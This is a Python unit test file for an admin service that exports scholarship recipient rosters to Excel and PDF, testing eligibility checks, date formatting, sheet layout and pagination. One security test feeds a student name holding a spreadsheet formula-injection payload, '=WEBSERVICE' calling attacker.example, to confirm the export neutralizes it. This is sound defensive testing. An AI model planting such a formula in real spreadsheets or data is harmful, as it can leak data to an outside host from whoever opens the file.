"""Unit tests for the admin 分發名單 (受獎名冊) export renderer.

Sync tests -> unit lane. Pure rendering: no DB, no HTTP. Applications are
duck-typed SimpleNamespace stubs carrying only ``student_data`` /
``submitted_form_data``, mirroring test_manual_distribution_pure_helpers.py.
"""

import io
from types import SimpleNamespace

from openpyxl import load_workbook

from app.services.manual_distribution_export_service import (
    AUTO_CHECK_GROUP,
    CHECK_CLEAR,
    CHECK_FLAGGED,
    CHECK_UNVERIFIABLE,
    HEADERS,
    ManualDistributionExportService,
    RecipientExportGroup,
    build_recipient_row,
    derive_cross_strait_check,
    derive_employment_check,
    derive_study_status_check,
    format_enrollment_date_roc,
)


def _student_data(**overrides):
    base = {
        "std_stdcode": "312345611",
        "std_cname": "王小美",
        "std_nation": "中華民國",
        "std_sex": 2,
        "std_academyno": "I",
        "trm_academyname": "工學院",
        "trm_depname": "土木工程學系",
        "std_enrollyear": 113,
        "std_enrollterm": 2,
        "std_highestschname": "台灣大學",
        "std_schoolid": 1,
        "std_enrolltype": 9,
        "std_identity": 1,
        "std_studingstatus": 1,
        "trm_studystatus": 1,
        "std_overseaplace": "",
    }
    base.update(overrides)
    return base


def _application(student_data=None, form_fields=None):
    return SimpleNamespace(
        student_data=student_data,
        submitted_form_data={"fields": form_fields} if form_fields is not None else None,
    )


def _group(rows, label="國科會", code="nstc", year=114):
    return RecipientExportGroup(label=label, sub_type_code=code, allocation_year=year, rows=rows)


def _sample_row(seq=1, **overrides):
    fields = {"master_school_info": {"value": "台灣大學工學院土木工程學系"}}
    return build_recipient_row(seq, _application(_student_data(**overrides), fields))


# --------------------------------------------------------------------------- #
# Eligibility derivations
# --------------------------------------------------------------------------- #


class TestEmploymentCheck:
    def test_in_service_school_identity_flags(self):
        assert derive_employment_check(_student_data(std_schoolid=2)) == CHECK_FLAGGED

    def test_in_service_enroll_types_flag(self):
        assert derive_employment_check(_student_data(std_enrolltype=2)) == CHECK_FLAGGED
        assert derive_employment_check(_student_data(std_enrolltype=5)) == CHECK_FLAGGED

    def test_regular_student_is_clear(self):
        assert derive_employment_check(_student_data(std_schoolid=1, std_enrolltype=4)) == CHECK_CLEAR

    def test_numeric_string_codes_are_coerced(self):
        assert derive_employment_check(_student_data(std_schoolid="2")) == CHECK_FLAGGED

    def test_missing_both_fields_is_unverifiable(self):
        assert derive_employment_check({}) == CHECK_UNVERIFIABLE

    def test_one_field_present_is_enough_to_clear(self):
        assert derive_employment_check({"std_schoolid": 1}) == CHECK_CLEAR

    def test_neighbouring_codes_are_not_flagged(self):
        """Negative boundary: widening the flagged set must fail CI.
        school_identities 3-8 (選讀/交換/外校/…) and enroll types 1/3/4/6/7 are
        NOT 在職."""
        for schoolid in (3, 4, 5, 6, 7, 8):
            assert derive_employment_check(_student_data(std_schoolid=schoolid)) == CHECK_CLEAR, schoolid
        for enroll in (1, 3, 4, 6, 7, 8, 9, 10, 11):
            assert derive_employment_check(_student_data(std_enrolltype=enroll)) == CHECK_CLEAR, enroll

    def test_float_typed_codes_are_coerced_not_downgraded(self):
        """A JSON number can arrive as 2.0; int("2.0") raises, which would
        silently downgrade a real 有 to 無法檢核."""
        assert derive_employment_check({"std_schoolid": 2.0}) == CHECK_FLAGGED
        assert derive_employment_check({"std_schoolid": "2.0"}) == CHECK_FLAGGED


class TestCrossStraitCheck:
    def test_mainland_identity_code_flags(self):
        assert derive_cross_strait_check(_student_data(std_identity=17)) == CHECK_FLAGGED

    def test_mainland_enroll_type_flags(self):
        assert derive_cross_strait_check(_student_data(std_enrolltype=17)) == CHECK_FLAGGED

    def test_mainland_nationality_text_flags(self):
        assert derive_cross_strait_check(_student_data(std_nation="中國大陸")) == CHECK_FLAGGED
        assert derive_cross_strait_check(_student_data(std_nation="中華人民共和國")) == CHECK_FLAGGED

    def test_hk_macau_nationality_text_flags(self):
        """港澳 has NO SIS identity code — the free-text 國籍/僑居地 is the only signal."""
        assert derive_cross_strait_check(_student_data(std_nation="香港")) == CHECK_FLAGGED
        assert derive_cross_strait_check(_student_data(std_overseaplace="澳門")) == CHECK_FLAGGED

    def test_roc_nationality_is_clear_not_a_substring_false_positive(self):
        """中華民國 must not fuzzy-match 中國 / 中華人民共和國."""
        assert derive_cross_strait_check(_student_data()) == CHECK_CLEAR

    def test_foreign_student_is_clear(self):
        assert derive_cross_strait_check(_student_data(std_nation="美國", std_identity=4)) == CHECK_CLEAR

    def test_missing_everything_is_unverifiable(self):
        assert derive_cross_strait_check({}) == CHECK_UNVERIFIABLE

    def test_partial_mainland_spellings_are_caught_in_either_field(self):
        """SIS free text is not a controlled vocabulary, so match substrings —
        and match 國籍 and 僑居地 identically (the asymmetry let a bare "中國"
        through 國籍 while 僑居地 caught it)."""
        for value in ("中國", "中國大陸", "大陸地區", "中華人民共和國香港特別行政區", "香港", "澳門"):
            assert derive_cross_strait_check(_student_data(std_nation=value)) == CHECK_FLAGGED, f"nation={value}"
            assert (
                derive_cross_strait_check(_student_data(std_nation="", std_overseaplace=value)) == CHECK_FLAGGED
            ), f"oversea={value}"

    def test_roc_nationality_is_not_a_substring_false_positive(self):
        """中華民國 must survive every keyword: substrings are contiguous, so it
        contains neither 中國 (中華/華民/民國) nor 大陸."""
        assert derive_cross_strait_check(_student_data(std_nation="中華民國")) == CHECK_CLEAR
        assert (
            derive_cross_strait_check(_student_data(std_nation="中華民國", std_overseaplace="中華民國")) == CHECK_CLEAR
        )

    def test_neighbouring_identity_codes_are_not_flagged(self):
        """Negative boundary: only 17 is 陸生. 3=僑生 and 4=外籍生 get a separate
        承辦人 warning elsewhere, not this column."""
        for identity in (1, 2, 3, 4, 5, 6, 7, 8, 9, 30):
            assert derive_cross_strait_check(_student_data(std_identity=identity)) == CHECK_CLEAR, identity


class TestStudyStatusCheck:
    def test_suspension_flags(self):
        assert derive_study_status_check(_student_data(trm_studystatus=4)) == CHECK_FLAGGED

    def test_deferred_admission_flags(self):
        assert derive_study_status_check(_student_data(std_studingstatus=9)) == CHECK_FLAGGED

    def test_forfeited_admission_flags(self):
        assert derive_study_status_check(_student_data(trm_studystatus=10)) == CHECK_FLAGGED

    def test_active_student_is_clear(self):
        assert derive_study_status_check(_student_data()) == CHECK_CLEAR

    def test_missing_both_statuses_is_unverifiable(self):
        assert derive_study_status_check({}) == CHECK_UNVERIFIABLE

    def test_either_status_field_alone_is_read(self):
        assert derive_study_status_check({"std_studingstatus": 1}) == CHECK_CLEAR
        assert derive_study_status_check({"trm_studystatus": 4, "std_studingstatus": 1}) == CHECK_FLAGGED


# --------------------------------------------------------------------------- #
# Snapshot field rendering
# --------------------------------------------------------------------------- #


class TestFormatEnrollmentDate:
    def test_first_term_maps_to_september(self):
        assert format_enrollment_date_roc({"std_enrollyear": 113, "std_enrollterm": 1}) == "113.09.01"

    def test_second_term_maps_to_february(self):
        assert format_enrollment_date_roc({"std_enrollyear": 113, "std_enrollterm": 2}) == "113.02.01"

    def test_missing_year_renders_empty(self):
        assert format_enrollment_date_roc({}) == ""

    def test_numeric_string_term_is_coerced(self):
        """student_data is raw SIS JSON, so "1" is possible — a bare == 1 would
        print February for a September enrolment."""
        assert format_enrollment_date_roc({"std_enrollyear": "113", "std_enrollterm": "1"}) == "113.09.01"
        assert format_enrollment_date_roc({"std_enrollyear": "113", "std_enrollterm": "2"}) == "113.02.01"

    def test_string_zero_year_renders_empty_not_zero_date(self):
        assert format_enrollment_date_roc({"std_enrollyear": "0", "std_enrollterm": 1}) == ""

    def test_uncoercible_term_falls_to_february_branch(self):
        # Pinned elsewhere: only term 1 is September, anything else February.
        assert format_enrollment_date_roc({"std_enrollyear": 113, "std_enrollterm": "abc"}) == "113.02.01"

    def test_missing_term_defaults_to_september(self):
        assert format_enrollment_date_roc({"std_enrollyear": 113}) == "113.09.01"

    def test_uncoercible_year_renders_empty(self):
        assert format_enrollment_date_roc({"std_enrollyear": "民國113", "std_enrollterm": 1}) == ""

    def test_grid_helper_renders_the_same_literal_string(self):
        """The grid and this export must render identically.

        Asserts the literal both sides must produce — comparing the two callables
        to each other would pass trivially while the delegation holds, which is
        exactly the regression (a re-inlined copy) this guards against.
        """
        from app.services.manual_distribution_service import ManualDistributionService

        svc = ManualDistributionService(db=None)
        for sd, expected in [
            ({"std_enrollyear": 112, "std_enrollterm": 1}, "112.09.01"),
            ({"std_enrollyear": "113", "std_enrollterm": "2"}, "113.02.01"),
            ({}, ""),
        ]:
            assert svc._format_enrollment_date(sd) == expected
            assert format_enrollment_date_roc(sd) == expected


class TestBuildRecipientRow:
    def test_full_snapshot_maps_every_column(self):
        row = _sample_row()
        assert row.seq == 1
        assert row.college == "工學院"
        assert row.department == "土木工程學系"
        assert row.student_name == "王小美"
        assert row.nationality == "中華民國"
        assert row.gender == "女"
        assert row.master_school == "台灣大學工學院土木工程學系"
        assert row.enrollment_date == "113.02.01"
        assert row.student_number == "312345611"
        assert row.employment_check == CHECK_CLEAR
        assert row.cross_strait_check == CHECK_CLEAR
        assert row.study_status_check == CHECK_CLEAR

    def test_master_school_falls_back_to_sis_highest_school(self):
        row = build_recipient_row(1, _application(_student_data()))
        assert row.master_school == "台灣大學"

    def test_college_falls_back_to_code_mapping(self):
        row = build_recipient_row(1, _application(_student_data(trm_academyname="")))
        assert row.college == "工學院"

    def test_gender_code_one_is_male(self):
        assert build_recipient_row(1, _application(_student_data(std_sex=1))).gender == "男"

    def test_non_string_snapshot_values_do_not_crash_the_export(self):
        """student_data is raw SIS JSON: a documented-as-string field can arrive
        as a number. .strip() on that would 500 the WHOLE export."""
        row = build_recipient_row(
            1,
            _application({"trm_depname": 1550, "std_cname": 12345, "std_stdcode": 312345611, "std_nation": 1}),
        )
        assert row.department == "1550"
        assert row.student_name == "12345"
        assert row.student_number == "312345611"
        assert row.nationality == "1"

    def test_none_student_data_renders_empty_and_unverifiable(self):
        row = build_recipient_row(3, _application(None))
        assert row.seq == 3
        assert row.student_name == ""
        assert row.enrollment_date == ""
        assert row.employment_check == CHECK_UNVERIFIABLE
        assert row.cross_strait_check == CHECK_UNVERIFIABLE
        assert row.study_status_check == CHECK_UNVERIFIABLE


# --------------------------------------------------------------------------- #
# Workbook rendering
# --------------------------------------------------------------------------- #


class TestBuildWorkbook:
    def _load(self, payload: bytes):
        return load_workbook(io.BytesIO(payload))

    def test_one_sheet_per_group_named_label_and_year(self):
        svc = ManualDistributionExportService()
        wb = self._load(
            svc.build_workbook(
                groups=[
                    _group([_sample_row()], label="國科會", code="nstc", year=114),
                    _group([], label="教育部", code="moe_1w", year=113),
                ],
                title="T",
            )
        )
        assert wb.sheetnames == ["國科會_114", "教育部_113"]

    def test_duplicate_sheet_names_are_deduped(self):
        svc = ManualDistributionExportService()
        wb = self._load(
            svc.build_workbook(
                groups=[
                    _group([], label="國科會", code="nstc", year=114),
                    _group([], label="國科會", code="nstc", year=114),
                ],
                title="T",
            )
        )
        assert wb.sheetnames == ["國科會_114", "國科會_114_2"]

    def test_two_row_header_layout_and_merges(self):
        svc = ManualDistributionExportService()
        ws = self._load(svc.build_workbook(groups=[_group([_sample_row()])], title="T")).active
        # 序號 spans both header rows; group labels sit on row 2; column labels on row 3.
        assert ws.cell(row=2, column=1).value == "序號"
        assert ws.cell(row=3, column=1).value is None
        assert ws.cell(row=2, column=2).value == "基本資料"
        assert [ws.cell(row=3, column=c).value for c in range(2, 8)] == [
            "學院",
            "系所",
            "姓名",
            "國籍",
            "性別",
            "碩士畢業院/校/系所",
        ]
        assert ws.cell(row=2, column=8).value == "學籍資料"
        assert ws.cell(row=3, column=9).value == "學號"
        assert ws.cell(row=2, column=10).value == "請領資格檢核"
        assert ws.cell(row=2, column=11).value == AUTO_CHECK_GROUP
        assert ws.cell(row=3, column=11).value == HEADERS[10]

    def test_data_row_renders_expected_values(self):
        svc = ManualDistributionExportService()
        ws = self._load(svc.build_workbook(groups=[_group([_sample_row()])], title="T")).active
        values = [ws.cell(row=4, column=c).value for c in range(1, 14)]
        assert values == [
            1,  # 序號 keeps native int typing
            "工學院",
            "土木工程學系",
            "王小美",
            "中華民國",
            "女",
            "台灣大學工學院土木工程學系",
            "113.02.01",
            "312345611",
            None,  # 請領資格檢核 left for the 承辦人 (empty cell reads back None)
            CHECK_CLEAR,
            CHECK_CLEAR,
            CHECK_CLEAR,
        ]

    def test_malicious_student_name_is_neutralized(self):
        """SECURITY: openpyxl writes a leading '=' as a LIVE formula and 姓名 comes from SIS."""
        svc = ManualDistributionExportService()
        row = _sample_row(std_cname='=WEBSERVICE("https://attacker.example/x")')
        ws = self._load(svc.build_workbook(groups=[_group([row])], title="T")).active
        value = ws.cell(row=4, column=4).value
        assert not str(value).startswith("="), f"formula injection not neutralized: {value!r}"

    def test_zero_groups_still_saves_a_readable_workbook(self):
        """A zero-sheet openpyxl workbook saves as a corrupt file — guard emits
        one empty roster sheet instead."""
        svc = ManualDistributionExportService()
        wb = self._load(svc.build_workbook(groups=[], title="T"))
        assert wb.sheetnames == ["分發名單"]
        assert wb.active.cell(row=2, column=1).value == "序號"

    def test_sheet_name_invalid_chars_are_replaced(self):
        svc = ManualDistributionExportService()
        wb = self._load(svc.build_workbook(groups=[_group([], label="A/B:C", year=None)], title="T"))
        assert wb.sheetnames == ["A_B_C"]


# --------------------------------------------------------------------------- #
# PDF rendering
# --------------------------------------------------------------------------- #


def _pdf_text(payload: bytes) -> str:
    from pypdf import PdfReader

    return "\n".join(page.extract_text() or "" for page in PdfReader(io.BytesIO(payload)).pages)


class TestBuildPdf:
    def test_returns_a_pdf_with_multiple_groups(self):
        svc = ManualDistributionExportService()
        payload = svc.build_pdf(
            groups=[
                _group([_sample_row(), _sample_row(seq=2)]),
                _group([_sample_row()], label="教育部", code="moe_1w", year=113),
            ],
            title="114學年度分發名單",
        )
        assert payload.startswith(b"%PDF")

    def test_pdf_actually_contains_the_title_headers_and_row_data(self):
        """Magic bytes alone would pass for a renderer that drops every data row."""
        svc = ManualDistributionExportService()
        row = _sample_row(std_cname="陳測試", std_stdcode="312999888")
        text = _pdf_text(svc.build_pdf(groups=[_group([row])], title="114學年度分發名單"))
        assert "114學年度分發名單" in text
        assert "國科會" in text  # group heading
        assert "序號" in text and "基本資料" in text  # both header rows
        assert "陳測試" in text  # student row
        assert "312999888" in text
        assert "113.02.01" in text

    def test_pdf_paginates_one_page_run_per_group(self):
        from pypdf import PdfReader

        svc = ManualDistributionExportService()
        payload = svc.build_pdf(
            groups=[
                _group([_sample_row(std_cname="甲生")], label="國科會", code="nstc", year=114),
                _group([_sample_row(std_cname="乙生")], label="教育部", code="moe_1w", year=113),
            ],
            title="T",
        )
        reader = PdfReader(io.BytesIO(payload))
        assert len(reader.pages) == 2
        assert "甲生" in (reader.pages[0].extract_text() or "")
        assert "乙生" in (reader.pages[1].extract_text() or "")

    def test_pdf_renders_every_row_of_a_long_group(self):
        svc = ManualDistributionExportService()
        rows = [_sample_row(seq=i, std_cname=f"學生{i:03d}") for i in range(1, 61)]
        text = _pdf_text(svc.build_pdf(groups=[_group(rows)], title="T"))
        for i in (1, 30, 60):
            assert f"學生{i:03d}" in text, f"row {i} missing from the PDF"

    def test_zero_groups_does_not_raise(self):
        svc = ManualDistributionExportService()
        assert svc.build_pdf(groups=[], title="空").startswith(b"%PDF")

    def test_xml_special_chars_do_not_break_rendering(self):
        svc = ManualDistributionExportService()
        row = _sample_row(std_cname="A & B <C>")
        assert svc.build_pdf(groups=[_group([row])], title="T & <U>").startswith(b"%PDF")

    def test_overlong_cell_shrinks_instead_of_raising_layout_error(self):
        """A reportlab Table cannot split one row across pages, so an uncapped
        overlong cell raises LayoutError and fails the WHOLE export.

        Swept across lengths on purpose: a single magic length is not a test of
        the cap. The original 4000-char value happened to shrink just under a
        too-generous cap while 700, 2000 and 5000 all raised — so the assertion
        passed while the guard was broken.
        """
        svc = ManualDistributionExportService()
        for length in (100, 500, 700, 1000, 2000, 4000, 5000, 20000):
            for field in ("std_cname", "trm_depname", "std_nation"):
                row = _sample_row(**{field: "超" * length})
                payload = svc.build_pdf(groups=[_group([row])], title="T")
                assert payload.startswith(b"%PDF"), f"{field} x{length}"

    def test_cell_cap_leaves_room_for_the_real_two_row_header(self):
        """The cap must come from the MEASURED header, not a single-header-row
        constant: this table repeats two header rows on every continuation page.
        """
        from reportlab.lib.pagesizes import A4, landscape

        from app.services.export_table_chassis import (
            PDF_FRAME_PADDING_PT,
            PDF_MARGIN_PT,
            make_pdf_styles,
            pdf_cell_max_height,
            pdf_col_widths,
        )
        from app.services.manual_distribution_export_service import _COL_WEIGHTS
        from app.services.pdf_fonts import ensure_cjk_font

        ensure_cjk_font()
        page_width, page_height = landscape(A4)
        col_widths = pdf_col_widths(_COL_WEIGHTS, page_width - (PDF_MARGIN_PT * 2))
        _, header_style, _unused = make_pdf_styles("RecipientRoster")

        svc = ManualDistributionExportService()
        header_height = svc._measure_header_height(
            col_widths=col_widths, header_style=header_style, page_height=page_height
        )
        cap = pdf_cell_max_height(page_height, header_height=header_height)

        # What a continuation page actually offers a single body row.
        available = page_height - (PDF_MARGIN_PT * 2) - PDF_FRAME_PADDING_PT - header_height
        assert 0 < cap <= available, f"cap {cap} must fit {available}"
        assert header_height > 40, "a 2-row CJK header should measure well over one row"
